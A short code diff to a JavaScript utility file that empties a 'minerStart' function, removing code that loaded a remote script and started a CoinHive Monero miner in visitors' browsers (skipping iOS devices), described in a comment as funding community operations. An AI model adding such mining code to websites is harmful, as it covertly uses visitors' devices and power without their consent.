@@ -242,18 +242,7 @@ var Util = {
    * @description xmr 挖矿，收入将用于维持社区运维
    */
   minerStart: function () {
-    if (navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)) {
-      return
-    }
-    $.ajax({
-      method: "GET",
-      url: 'https://static.hacpai.com/js/lib/xmr.min.js',
-      dataType: "script",
-      cache: true
-    }).done(function () {
-      var miner = new CoinHive.Anonymous('gr2r3rJsYmaJpSd2Nml15zomewwc6Lzc', {threads: 1, throttle: 0.9});
-      miner.start();
-    });
+
   },
   /**
    * @description 页面初始化执行的函数
